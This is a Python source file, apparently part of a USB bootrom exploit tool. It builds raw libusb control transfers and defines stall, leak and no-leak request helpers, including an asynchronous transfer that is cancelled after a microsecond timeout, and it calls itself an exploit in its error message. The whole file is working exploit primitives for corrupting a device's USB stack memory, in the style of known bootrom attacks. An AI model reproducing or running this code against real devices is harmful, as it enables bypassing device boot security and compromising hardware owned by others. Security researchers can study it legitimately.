import array
import ctypes
import struct
import sys
import time
from contextlib import suppress
from typing import TYPE_CHECKING, Any, Union

import usb  # type: ignore

if TYPE_CHECKING:
    from usb.core import Device  # type: ignore


# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None


def libusb1_create_ctrl_transfer(device: "Device", request: Any, timeout: int):
    assert usb.backend.libusb1._lib

    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
    assert ptr is not None

    transfer = ptr.contents
    transfer.dev_handle = device._ctx.handle.handle
    transfer.endpoint = 0  # EP0
    transfer.type = 0  # LIBUSB_TRANSFER_TYPE_CONTROL
    transfer.timeout = timeout
    transfer.buffer = request.buffer_info()[0]  # C-pointer to request buffer
    transfer.length = len(request)
    transfer.user_data = None
    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0)  # NULL
    transfer.flags = 1 << 1  # LIBUSB_TRANSFER_FREE_BUFFER

    return ptr


def libusb1_async_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data: bytes,
    timeout: float,
) -> None:
    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print(
            "ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting."
        )
        sys.exit(1)

    global request, transfer_ptr, never_free_device
    request_timeout = int(timeout) if timeout >= 1 else 0
    start = time.time()
    never_free_device = device
    request = array.array(
        "B",
        struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
        + data,
    )
    transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

    while time.time() - start < timeout / 1000.0:
        pass

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)
    ]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0


def libusb1_no_error_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data_or_w_length: Union[int, bytes],
    timeout: int,
) -> None:
    with suppress(usb.core.USBError):
        device.ctrl_transfer(
            bm_request_type, b_request, w_value, w_index, data_or_w_length, timeout
        )


TRANSFER_DEVICE_TO_HOST = 0x80
TRANSFER_ENDPOINT_FROM_HOST = 0x02
REQUEST_SET_FEATURE = 0x03
REQUEST_GET_DESCRIPTOR = 0x06
ENDPOINT_FEATURE_HALT = 0x00
TIMEOUT_TINY = 0.00001
TIMEOUT_STANDARD = 1
TIMEOUT_LONG = 10
LANG_ID_ENGLISH = 0x0409
LANG_ID_SPANISH = 0x040A
DESCRIPTOR_TYPE_STRING = 0x03
STRING_INDEX_SERIAL = 0x04
SERIAL_STRING_DESCRIPTOR = (DESCRIPTOR_TYPE_STRING << 8) | STRING_INDEX_SERIAL


def stall(device: "Device") -> None:
    libusb1_async_ctrl_transfer(
        device,
        TRANSFER_DEVICE_TO_HOST,
        REQUEST_GET_DESCRIPTOR,
        SERIAL_STRING_DESCRIPTOR,
        LANG_ID_SPANISH,
        b"A" * 0xC0,
        TIMEOUT_TINY,
    )


def usb_req_stall(device: "Device") -> None:
    libusb1_no_error_ctrl_transfer(
        device,
        TRANSFER_ENDPOINT_FROM_HOST,
        REQUEST_SET_FEATURE,
        ENDPOINT_FEATURE_HALT,
        TRANSFER_DEVICE_TO_HOST,
        0x0,
        TIMEOUT_LONG,
    )


def usb_req_leak(device: "Device") -> None:
    libusb1_no_error_ctrl_transfer(
        device,
        TRANSFER_DEVICE_TO_HOST,
        REQUEST_GET_DESCRIPTOR,
        SERIAL_STRING_DESCRIPTOR,
        LANG_ID_SPANISH,
        0x40,
        TIMEOUT_STANDARD,
    )


def leak(device: "Device"):
    libusb1_no_error_ctrl_transfer(
        device,
        TRANSFER_DEVICE_TO_HOST,
        REQUEST_GET_DESCRIPTOR,
        SERIAL_STRING_DESCRIPTOR,
        LANG_ID_SPANISH,
        0xC0,
        TIMEOUT_STANDARD,
    )


def no_leak(device: "Device") -> None:
    libusb1_no_error_ctrl_transfer(
        device,
        TRANSFER_DEVICE_TO_HOST,
        REQUEST_GET_DESCRIPTOR,
        SERIAL_STRING_DESCRIPTOR,
        LANG_ID_SPANISH,
        0xC1,
        TIMEOUT_STANDARD,
    )


def usb_req_no_leak(device: "Device"):
    libusb1_no_error_ctrl_transfer(
        device,
        TRANSFER_DEVICE_TO_HOST,
        REQUEST_GET_DESCRIPTOR,
        0x304,
        LANG_ID_SPANISH,
        0x41,
        TIMEOUT_STANDARD,
    )
